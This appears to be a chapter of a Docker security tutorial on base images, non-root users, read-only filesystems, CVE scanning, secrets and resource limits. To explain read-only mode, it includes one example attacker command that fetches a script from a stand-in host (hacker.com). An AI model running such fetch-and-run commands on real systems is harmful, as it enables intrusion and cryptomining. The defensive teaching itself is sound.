Choosing the Right Base Image

The foundation of every container is its base image. Choosing the wrong base image is the #1 cause of slow deployments and critical security vulnerabilities in our production environment.

  • ubuntu: The absolute largest and heaviest base line. Includes massive unneeded utilities. Never use this for production apps.
  • debian-slim: An excellent, highly-compatible compromise. It strips out unneeded documentation and extra tools but keeps the standard safe C libraries (glibc).
  • alpine: Extremely tiny. It replaces standard GNU C libraries with musl libc. While tiny, this is notoriously known for breaking Python C-bindings (like pandas or bcrypt). Proceed with caution in interpreted languages!
  • distroless: The ultimate security pinnacle. Created by Google, it contains absolutely ZERO shell environment (no `bash`, no `ls`, no `cd`). It ONLY contains our application. If a hacker breaches our app, they have no terminal to explore our system.

Image Size Comparison

Base Image Starting Size Primary Use Case
python:3.11 (Ubuntu-based) ~900 MB Local debugging or complex data science apps requiring heavy C++ compilers.
python:3.11-slim ~120 MB The default golden standard for production web apps.
python:3.11-alpine ~50 MB Ultra-lean microservices (but watch out for C-binding build errors).
gcr.io/distroless/python3 ~50 MB Maximum security. No shell access available.

The USER Instruction (Non-Root Magic)

By default, the process running inside every Docker container executes as the root user (User ID 0). This means if a hacker exploits an upload vulnerability in our app, they instantly own the container with maximum privileges.

We must ALWAYS create a restricted user and downgrade our privileges before booting our app.

FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm ci

# The node alpine image handily comes with a pre-created 
# restricted user simply named 'node'. We switch to it:
USER node

# Our app now boots with zero root permissions
CMD ["npm", "start"]

Read-Only Filesystems

Hackers love to download their malicious cryptomining scripts directly into our container's temporary directories. We can mathematically prevent this by telling Docker to boot the container perfectly Read-Only.

docker run --read-only my-app
Now, if a hacker manages to execute wget hacker.com/script.sh inside our app, the Linux kernel will aggressively block the download with a Read-Only Filesystem error.

If our app dynamically needs to write files (like uploading avatars), we explicitly map a specific tmpfs or Named Volume strictly just for that directory.

Vulnerability Scanning (Docker Scout)

We should never blindly trust public images. Vulnerabilities (CVEs) are discovered constantly. Docker provides a built-in security scanner to analyze our layers before we deploy.

# Scan our newly built image against the live global CVE database
docker scout cves my-app:latest

This command outputs a detailed breakdown of exactly which layer and which specific apt/npm/pip package introduces a Critical, High, or Medium vulnerability, and crucially, gives us the exact upgraded version number required to patch it.

Secrets Management

⚠️ The Permanent Secret Trap:
If we write ENV AWS_KEY=12345 or COPY .env . in our Dockerfile, that secret is permanently baked into the image history block forever. Even if we explicitly say RUN rm .env in the very next line, an attacker can simply reverse-engineer the previous layer and read our keys.

The Rule: NEVER BAKE SECRETS. All secrets must be injected dynamically at runtime using Docker Compose `env_file:` or cloud secrets managers (like AWS Parameter Store or Kubernetes Secrets).

Imposing Resource Limits

A single buggy Docker container caught in an infinite `while(true)` loop can accidentally consume 100% of our host server's CPU and RAM, starving every other application to death.

We must explicitly sandbox the resources available to our containers.

# Limit to 512 Megabytes of RAM and exactly half of one CPU core
docker run -d --memory="512m" --cpus="0.5" my-app

In Docker Compose, this is translated to the deploy block:

services:
  api:
    image: my-app
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M

Revisiting .dockerignore

We discussed it in Chapter 5, but its security impact cannot be overstated. A missing .dockerignore is the single most common reason entire .git/ directories (containing git history and sensitive configuration) or local .env files accidentally get uploaded to public Docker Registries.

Before launching to production, we must manually run an interactive bash shell (docker run -it my-app bash) and manually inspect our root directory to ensure exactly zero garbage files made it into the final image.
